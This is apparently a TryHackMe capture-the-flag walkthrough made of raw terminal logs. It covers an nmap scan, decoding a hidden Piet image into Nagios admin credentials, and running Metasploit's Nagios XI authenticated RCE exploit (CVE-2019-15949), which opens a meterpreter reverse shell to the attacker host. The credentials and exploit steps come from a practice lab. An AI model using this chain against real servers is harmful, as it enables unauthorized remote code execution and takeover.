```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.176.66
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-28 14:08 UTC
Nmap scan report for ip-10-10-176-66.eu-west-1.compute.internal (10.10.176.66)
Host is up (0.00079s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-03-23T23:42:04
|_Not valid after:  2030-03-21T23:42:04
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-03-24T00:14:58
|_Not valid after:  2030-03-22T00:14:58
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
5667/tcp open  tcpwrapped
MAC Address: 02:C8:93:4C:0A:90 (Unknown)
Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.43 seconds
r
```

- http://10.10.176.66/
```
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2020 14:08:53 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 25 Mar 2020 03:47:22 GMT
ETag: "534-5a1a5b9ce3fa2-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 1332
Connection: close
Content-Type: text/html

<html>
<head></head>
<body>
<! --/nagiosxi/ --> 
	<pre>
		     ,+++77777++=:,                    +=                      ,,++=7++=,,
		    7~?7   +7I77 :,I777  I          77 7+77 7:        ,?777777??~,=+=~I7?,=77 I
		=7I7I~7  ,77: ++:~+777777 7     +77=7 =7I7     ,I777= 77,:~7 +?7, ~7   ~ 777?
		77+7I 777~,,=7~  ,::7=7: 7 77   77: 7 7 +77,7 I777~+777I=   =:,77,77  77 7,777,
		  = 7  ?7 , 7~,~  + 77 ?: :?777 +~77 77? I7777I7I7 777+77   =:, ?7   +7 777?
		      77 ~I == ~77=77777~: I,+77?  7  7:?7? ?7 7 7 77 ~I   7I,,?7 I77~
		       I 7=77~+77+?=:I+~77?     , I 7? 77 7   777~ +7 I+?7  +7~?777,77I
		         =77 77= +7 7777         ,7 7?7:,??7     +7    7   77??+ 7777,
		             =I, I 7+:77?         +7I7?7777 :             :7 7
		                7I7I?77 ~         +7:77,     ~         +7,::7   7
		               ,7~77?7? ?:         7+:77           77 :7777=
		                ?77 +I7+,7         7~  7,+7  ,?       ?7?~?777:
		                   I777=7777 ~     77 :  77 =7+,    I77  777
		                     +      ~?     , + 7    ,, ~I,  = ? ,
		                                    77:I+
		                                    ,7
		                                     :777
		                                        :
						Welcome to elements.
					Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
	</pre>
</body>
<html>

```


```
Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
47 80 73 51 84 46 80 78 103
https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)&input=NDcgODAgNzMgNTEgODQgNDYgODAgNzggMTAz
/PI3T.PNg
```

```
root@kali:~# exiftool PI3T.PNg
ExifTool Version Number         : 11.98
File Name                       : PI3T.PNg
Directory                       : .
File Size                       : 959 kB
File Modification Date/Time     : 2020:03:25 04:00:15+00:00
File Access Date/Time           : 2020:07:28 14:28:42+00:00
File Inode Change Date/Time     : 2020:07:28 14:28:42+00:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 990
Image Height                    : 990
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 768 bytes, use -b option to extract)
Transparency                    : (Binary data 256 bytes, use -b option to extract)
Artist                          : Piet Mondrian
Copyright                       : Piet Mondrian, tryhackme 2020
Image Size                      : 990x990
Megapixels                      : 0.980
```

- https://www.bertnase.de/npiet/npiet-execute.php

```
C:\Users\shuna\Downloads\npiet-1.3a-win32>npiet.exe -e 1000000 PI3T.png
libpng warning: Extra compressed data.
libpng warning: Extra compression data
nagiosadmin%n3p3UQ&9BjLp4$7uhWdY
nagiosadmin%n3p3UQ&9BjLp4$7uhWdY
nagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4
```
cve-2019-15949
**************

```

msf5 exploit(linux/http/nagios_xi_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_authenticated_rce):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   PASSWORD   n3p3UQ&9BjLp4$7uhWdY  yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.176.66          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                    yes       The target port (TCP)
   SRVHOST    0.0.0.0               yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080                  yes       The local port to listen on.
   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                     yes       Base path to NagiosXI
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME   nagiosadmin           yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)


msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set LHOST 10.10.82.63
LHOST => 10.10.82.63
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > run

[*] Started reverse TCP handler on 10.10.82.63:4444
[*] Found Nagios XI application with version 5.5.6.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting for the plugin to request the final payload...
[*] Sending stage (3012516 bytes) to 10.10.176.66
[*] Meterpreter session 1 opened (10.10.82.63:4444 -> 10.10.176.66:41226) at 2020-07-28 15:12:11 +0000
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > ls
Listing: /usr/local/nagiosxi/html/includes/components/profile
=============================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  1956   fil   2020-03-23 23:52:21 +0000  CHANGES.txt
100755/rwxr-xr-x  12022  fil   2020-07-28 14:07:03 +0000  getprofile.sh
100644/rw-r--r--  2423   fil   2020-03-23 23:52:21 +0000  profile.inc.php
100644/rw-r--r--  10885  fil   2020-03-23 23:52:21 +0000  profile.php
```
